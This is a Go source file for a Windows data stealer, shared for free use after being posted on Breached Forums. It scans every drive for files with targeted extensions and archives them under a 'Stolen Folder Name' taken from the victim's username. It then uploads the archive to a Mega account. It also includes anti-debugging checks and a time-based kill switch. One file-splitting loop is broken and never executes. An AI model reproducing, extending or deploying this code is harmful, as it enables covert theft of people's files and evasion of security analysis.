/*
Telegram: https://t.me/n1k7l4i
Open Sourced by n1k7 from breached forums, program is not for sale anymore.
Don't sell this product as everyone deserves to use it for free as they like.
~ peace out.
*/
package main

import (
	"archive/tar"
	"bufio"
	"compress/gzip"
	"encoding/json"
	"fmt"
	"github.com/gizak/termui/v3/widgets"
	"golang.org/x/sys/windows"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

func HostIDWithContext() (string, error) {
	var h windows.Handle
	err := windows.RegOpenKeyEx(windows.HKEY_LOCAL_MACHINE, windows.StringToUTF16Ptr(`SOFTWARE\Microsoft\Cryptography`), 0, windows.KEY_READ|windows.KEY_WOW64_64KEY, &h)
	if err != nil {
		return "", err
	}
	defer windows.RegCloseKey(h)
	const windowsRegBufLen = 74
	const uuidLen = 36
	var regBuf [windowsRegBufLen]uint16
	bufLen := uint32(windowsRegBufLen)
	var valType uint32
	err = windows.RegQueryValueEx(h, windows.StringToUTF16Ptr(`MachineGuid`), nil, &valType, (*byte)(unsafe.Pointer(&regBuf[0])), &bufLen)
	if err != nil {
		return "", err
	}
	hostID := windows.UTF16ToString(regBuf[:])
	hostIDLen := len(hostID)
	if hostIDLen != uuidLen {
		return "", fmt.Errorf("HostID incorrect: %q\n", hostID)
	}
	return strings.ToLower(hostID), nil
}

func HostID() (string, error) {
	return HostIDWithContext()
}

func Check() {
	for _, proc := range processes {
		if strings.Contains(strings.ToLower(os.Args[0]), proc) {
			os.Exit(1)
		}
	}
}

func Beingdebuggedpeb() {
	var pPeb uintptr
	_, _, _ = procNtQueryInformationProcess.Call(uintptr(windows.CurrentProcess()), 0, uintptr(unsafe.Pointer(&pPeb)), unsafe.Sizeof(pPeb), 0)
	if pPeb != 0 {
		windows.Exit(1)
	}
}

func _NtQueryInformationProcess() {
	hProcess := windows.CurrentProcess()
	var pProcBasicInfo ProcessBasicInformation

	status, _, _ := procNtQueryInformationProcess.Call(uintptr(hProcess), 0, uintptr(unsafe.Pointer(&pProcBasicInfo)), unsafe.Sizeof(pProcBasicInfo), 0)
	if status == 0 && pProcBasicInfo.PebBaseAddress.BeingDebugged != 0 {
		syscall.Exit(1)
	}
}

func newLogConsoleBox() *widgets.Paragraph {
	p := widgets.NewParagraph()
	p.Title = "Log Console"
	p.Text = logConsole
	return p
}

func updateParagraph(p *widgets.Paragraph) {
	p.Text = fmt.Sprintf("Path: %s\nStolen Folder Name: %s\nMax File Size(MB): %d\nSplit Size: %d\nTargeted File Extensions: %v\nAPI: %s\nMode: %s", configJs.Path, configJs.StolenFolderName, configJs.MaxFileSizeMB, configJs.SplitSize, configJs.TargetedFileExtensions, apiStatus, configJs.Mode)
}
func newOptionBox() *widgets.List {
	l := widgets.NewList()
	l.Title = "Options"
	l.Rows = []string{
		"b) BEGIN",
		"r) RELOAD CONFIG",
		"e) Exit",
	}
	return l
}

func checkTime(hardcodedTime time.Time, check bool) {
	if !check {
		return
	}

	for {
		resp, err := http.Get("http://worldtimeapi.org/api/timezone/Etc/UTC")
		if err != nil {
			fmt.Println(err)
			return
		}
		defer resp.Body.Close()
		body, _ := io.ReadAll(resp.Body)
		var t Time
		json.Unmarshal(body, &t)
		currentTime, _ := time.Parse("2006-01-02T15:04:05Z07:00", t.Datetime)
		if currentTime.After(hardcodedTime.Add(24 * time.Hour)) {
			os.Exit(1)
		} else {
			time.Sleep(10 * time.Second) // Check every 10 seconds
		}
	}
}

func loadConfig(path string) error {
	file, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	fileStr := strings.ReplaceAll(string(file), "\\", "\\\\")
	err = json.Unmarshal([]byte(fileStr), &configJs)
	if err != nil {
		return err
	}
	return nil
}

func begin() {
	m := mNew()
	err := m.Login(configJs.API.ID, configJs.API.Password)
	if err != nil {
		apiStatus = "BAD LOGIN!"
		log.Fatal(err)
	} else {
		apiStatus = "OK!"
	}
	if logFlag {
		fmt.Println("[+] Logged into Mega")
	}
	if configJs.Path == "" {
		configJs.Path = strings.Join(getDrives(), ";")
	} else {
		if _, err := os.Stat(configJs.Path); err == nil {
			if logFlag {
				fmt.Printf("[+] Using specified path: %s\n", configJs.Path)
			}
		} else {
			if logFlag {
				fmt.Printf("[-] Failed to access specified path: %s due to error: %v\n", configJs.Path, err)
			}
			configJs.Path = strings.Join(getDrives(), ";")
			if logFlag {
				fmt.Printf("[+] Using all available drives instead\n")
			}
		}
	}
	if configJs.StolenFolderName == "" {
		configJs.StolenFolderName = getComputerUsername()
	}
}

func archiveFiles(files []string) (string, error) {
	tempDir := os.TempDir()
	archivePath := filepath.Join(tempDir, configJs.StolenFolderName+".tar.gz")
	if _, err := os.Stat(archivePath); !os.IsNotExist(err) {
		err = os.RemoveAll(archivePath)
		if err != nil {
			return "", err
		}
	}
	tarGzFile, err := os.Create(archivePath)
	if err != nil {
		return "", err
	}
	defer tarGzFile.Close()
	gzWriter := gzip.NewWriter(tarGzFile)
	defer gzWriter.Close()
	tarWriter := tar.NewWriter(gzWriter)
	defer tarWriter.Close()
	for _, file := range files {
		fileReader, err := os.Open(file)
		if err != nil {
			return "", err
		}
		fileInfo, err := fileReader.Stat()
		if err != nil {
			return "", err
		}
		relativePath, err := filepath.Rel(configJs.Path, file)
		if err != nil {
			return "", err
		}
		header := &tar.Header{
			Name:    relativePath,
			Size:    fileInfo.Size(),
			Mode:    int64(fileInfo.Mode()),
			ModTime: fileInfo.ModTime(),
		}
		err = tarWriter.WriteHeader(header)
		if err != nil {
			return "", err
		}
		io.Copy(tarWriter, fileReader)
		fileReader.Close()
	}
	return archivePath, nil
}

func getComputerUsername() string {
	var size uint32 = 128
	var buffer = make([]uint16, size)
	err := syscall.GetUserNameEx(syscall.NameSamCompatible, &buffer[0], &size)
	if err != nil {
		return ""
	}
	return syscall.UTF16ToString(buffer[:size])
}

func uploadFile(filePath string, logBox *widgets.Paragraph) error {
	m := mNew()
	err := m.Login(configJs.API.ID, configJs.API.Password)
	if err != nil {
		return err
	}
	rootNode := m.FS.GetRoot()
	_, fileName := filepath.Split(filePath)
	_, err = m.UploadFile(filePath, rootNode, fileName, nil)
	if err != nil {
		addLogEntry(logBox, fmt.Sprintf("[-] %s", filePath))
		return err
	}
	addLogEntry(logBox, fmt.Sprintf("[+] %s", filePath))

	return nil
}

func getFiles(paths []string, maxFileSizeMB int, targetedFileExtensions []string) ([]string, error) {
	var files []string
	if len(paths) == 0 {
		paths = getDrives()
	}
	for _, path := range paths {
		err := filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				if os.IsPermission(err) {
					return nil
				}
				return nil
			}
			if info.IsDir() && skipDirs[info.Name()] {
				return filepath.SkipDir
			}
			if !info.IsDir() {
				ext := filepath.Ext(path)
				for _, targetedExt := range targetedFileExtensions {
					if strings.EqualFold(ext, targetedExt) && info.Size() <= int64(maxFileSizeMB)*1024*1024 {
						files = append(files, path)
						break
					}
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
	}
	return files, nil
}

func getDrives() []string {
	var drives []string
	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		f, err := os.Open(string(drive) + ":\\")
		if err == nil {
			drives = append(drives, string(drive)+":\\")
			f.Close()
		}
	}
	return drives
}

func addLogEntry(logBox *widgets.Paragraph, entry string) {
	logBox.Text = entry + "\n" + logBox.Text
}

func splitFile(filePath string, partSize int64) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	fileInfo, err := file.Stat()
	if err != nil {
		return nil, err
	}
	totalParts := fileInfo.Size() / partSize
	if fileInfo.Size()%partSize != 0 {
		totalParts++
	}
	var partFiles []string
	reader := bufio.NewReader(file)
	for i := int64(0); i < totalParts; i++ {
		partFilePath := fmt.Sprintf("%s.part%d", filePath, i)
		partFile, err := os.Create(partFilePath)
		if err != nil {
			return nil, err
		}
		writer := bufio.NewWriter(partFile)
		var partSize int64
		for partSize < partSize {
			buffer := make([]byte, 1024)
			bytesRead, err := reader.Read(buffer)
			if err != nil {
				break
			}
			writer.Write(buffer[:bytesRead])
			partSize += int64(bytesRead)
		}
		writer.Flush()
		partFile.Close()
		partFiles = append(partFiles, partFilePath)
	}
	return partFiles, nil
}
